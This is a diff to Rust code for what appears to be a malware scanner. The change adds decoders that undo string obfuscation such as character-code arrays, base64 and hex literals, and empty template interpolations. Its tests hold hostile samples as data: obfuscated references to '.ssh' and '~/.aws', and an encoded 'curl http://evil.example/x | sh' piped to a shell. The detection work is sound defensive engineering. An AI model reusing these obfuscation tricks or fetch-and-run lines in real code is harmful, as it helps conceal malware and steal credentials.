@@ -31,13 +31,63 @@ static REVERSED: LazyLock<Regex> = LazyLock::new(|| {
     Regex::new(r#"['"]([A-Za-z0-9_./:-]{3,60})['"](?:\.split\(\s*['"]{2}\s*\)\.reverse\(\)\.join\(\s*['"]{2}\s*\)|\[::-1\])"#).unwrap()
 });
 
+/// Character codes handed to a decoder of the package's own, whatever it is
+/// called: `_d([104,116,116,112,115])`, `String.fromCharCode.apply(null, […])`.
+static CODE_ARRAY_CALL: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"[A-Za-z_$][\w$.]*\(\s*(?:(?:null|this|String)\s*,\s*|\.\.\.)?\[\s*((?:0x[0-9a-fA-F]{2}|\d{2,3})(?:\s*,\s*(?:0x[0-9a-fA-F]{2}|\d{2,3})){2,255})\s*\]\s*\)").unwrap()
+});
+
+/// A base64 or hex literal handed to a decoder: `atob('…')`,
+/// `Buffer.from('…', 'base64')`, `b64decode('…')`, `echo … | base64 -d`,
+/// `Buffer.from('…', 'hex')`, `bytes.fromhex('…')`. Groups 1-3 are base64,
+/// 4-5 hex.
+static ENCODED_LITERAL: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"(?:(?:atob|b64decode|decodebytes|a2b_base64)\s*\(\s*b?['"`]([A-Za-z0-9+/_-]{16,}={0,2})['"`]|Buffer\.from\(\s*['"`]([A-Za-z0-9+/_-]{16,}={0,2})['"`]\s*,\s*['"`]base64(?:url)?['"`]|['"]?([A-Za-z0-9+/]{16,}={0,2})['"]?\s*\|\s*base64\s+(?:-d|-D|--decode)(?-u:\b)|Buffer\.from\(\s*['"`]([0-9a-fA-F]{16,})['"`]\s*,\s*['"`]hex['"`]|(?:fromhex|unhexlify)\s*\(\s*b?['"]([0-9a-fA-F]{16,})['"])"#).unwrap()
+});
+
+/// What the base64 and hex literals of `content` decode to, when that is
+/// text, with the byte offset of each literal: the payload of
+/// `eval(Buffer.from('…','base64'))` or `exec(b64decode('…'))`, a URL or a
+/// command kept encoded. Binary (a wasm module, a key) is left out.
+pub fn layers(content: &str) -> Vec<(usize, String)> {
+    use base64::Engine;
+    /// The most layers read from one file: a bundle can carry hundreds of
+    /// encoded assets.
+    const MAX_LAYERS: usize = 32;
+    ENCODED_LITERAL
+        .captures_iter(content)
+        .filter_map(|c| {
+            let bytes = if let Some(b64) = c.get(1).or(c.get(2)).or(c.get(3)) {
+                let text = b64.as_str().trim_end_matches('=');
+                base64::engine::general_purpose::STANDARD_NO_PAD
+                    .decode(text)
+                    .or_else(|_| base64::engine::general_purpose::URL_SAFE_NO_PAD.decode(text))
+                    .ok()?
+            } else {
+                hex::decode(c.get(4).or(c.get(5))?.as_str()).ok()?
+            };
+            let text = String::from_utf8(bytes).ok()?;
+            let is_text = text
+                .chars()
+                .all(|ch| !ch.is_control() || matches!(ch, '\n' | '\r' | '\t'));
+            is_text.then(|| (c.get(0).map_or(0, |m| m.start()), text))
+        })
+        .take(MAX_LAYERS)
+        .collect()
+}
+
+/// An interpolation of nothing in a template literal: `` `id_${''}rsa` ``.
+static EMPTY_INTERPOLATION: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r#"\$\{\s*(?:''|""|``)\s*\}"#).unwrap());
+
 /// `obj['name']`, which is `obj.name` to the engine and not to a rule.
 static BRACKET_NAME: LazyLock<Regex> =
     LazyLock::new(|| Regex::new(r#"\[\s*['"]([A-Za-z_$][\w$]{1,40})['"]\s*\]"#).unwrap());
 
-/// `content` with five cheap string disguises undone, so the rules see the
+/// `content` with seven cheap string disguises undone, so the rules see the
 /// name a line spells: `'fe'+'tch'`, `\x66etch`, `String.fromCharCode(102,
-/// 101,…)`, `'hctef'.split('').reverse().join('')` and `globalThis['fetch']`.
+/// 101,…)`, `_d([102,101,…])`, `'hctef'.split('').reverse().join('')`,
+/// `` `fe${''}tch` `` and `globalThis['fetch']`.
 /// Borrowed when the file uses none of them. No line is added or removed, so a line number in
 /// the result is the line number in the file.
 pub fn plain(content: &str) -> std::borrow::Cow<'_, str> {
@@ -73,6 +123,24 @@ pub fn plain(content: &str) -> std::borrow::Cow<'_, str> {
     if let Cow::Owned(s) = codes {
         text = Cow::Owned(s);
     }
+    // Inside quotes any printable character is safe but a quote, a backslash
+    // or a line break.
+    let arrays = CODE_ARRAY_CALL.replace_all(&text, |c: &regex::Captures| {
+        let decoded: Option<String> = c[1]
+            .split(',')
+            .map(|n| {
+                let n = n.trim();
+                n.strip_prefix("0x")
+                    .map_or_else(|| n.parse::<u8>().ok(), |h| u8::from_str_radix(h, 16).ok())
+                    .map(char::from)
+                    .filter(|ch| (' '..='~').contains(ch) && !"'\"`\\".contains(*ch))
+            })
+            .collect();
+        decoded.map_or_else(|| c[0].to_string(), |s| format!("'{s}'"))
+    });
+    if let Cow::Owned(s) = arrays {
+        text = Cow::Owned(s);
+    }
     let reversed = REVERSED.replace_all(&text, |c: &regex::Captures| {
         format!("'{}'", c[1].chars().rev().collect::<String>())
     });
@@ -80,6 +148,9 @@ pub fn plain(content: &str) -> std::borrow::Cow<'_, str> {
         text = Cow::Owned(s);
     }
     if let Cow::Owned(s) = CONCAT.replace_all(&text, "") {
+        text = Cow::Owned(s);
+    }
+    if let Cow::Owned(s) = EMPTY_INTERPOLATION.replace_all(&text, "") {
         text = Cow::Owned(s);
     }
     if let Cow::Owned(s) = BRACKET_NAME.replace_all(&text, ".$1") {
@@ -415,6 +486,46 @@ mod tests {
 
     fn plain_of(s: &str) -> std::borrow::Cow<'_, str> {
         plain(s)
+    }
+
+    #[test]
+    fn code_arrays_through_a_decoder_of_any_name() {
+        // @sbxapps/…-fieldservicetools-ui (dev): every string is `_d([…])`.
+        let src = "var https=require(_d([104,116,116,112,115]));var d=_path.join(hm,_d([46,115,115,104]));\n\
+                   k = String.fromCharCode.apply(null, [0x7e, 0x2f, 0x2e, 0x61, 0x77, 0x73]);\n";
+        let plain = plain(src);
+        assert_eq!(plain_of("p = `id_${''}rsa`;"), "p = `id_rsa`;");
+        for name in ["require('https')", "join(hm,'.ssh')", "k = '~/.aws';"] {
+            assert!(plain.contains(name), "{name} not in {plain}");
+        }
+        // A byte table (a quote among the codes) and two numbers stay as they are.
+        for src in ["t = crc([39, 200, 17, 34]);", "at(sum([10, 20]));"] {
+            assert!(
+                matches!(plain_of(src), std::borrow::Cow::Borrowed(_)),
+                "{src}"
+            );
+        }
+    }
+
+    #[test]
+    fn layers_decode_text_and_skip_binary() {
+        let src = "eval(Buffer.from('Y29uc3QgZnMgPSByZXF1aXJlKCdmcycpOw==', 'base64').toString());\n\
+                   exec(base64.b64decode(b'aW1wb3J0IG9zCm9zLnN5c3RlbSgnaWQnKQ=='))\n\
+                   os.system(\"echo Y3VybCBodHRwOi8vZXZpbC5leGFtcGxlL3ggfCBzaA== | base64 -d | sh\")\n\
+                   x = bytes.fromhex('68747470733a2f2f6576696c2e6578616d706c65')\n\
+                   wasm = atob('AGFzbQEAAAABBgFgAX8BfwMCAQAHBwEDZmliAAA=');\n";
+        let found = layers(src);
+        let texts: Vec<&str> = found.iter().map(|(_, t)| t.as_str()).collect();
+        assert_eq!(
+            texts,
+            [
+                "const fs = require('fs');",
+                "import os\nos.system('id')",
+                "curl http://evil.example/x | sh",
+                "https://evil.example",
+            ]
+        );
+        assert_eq!(found[0].0, 5);
     }
 
     fn names(v: &[RuleMatch]) -> Vec<&str> {
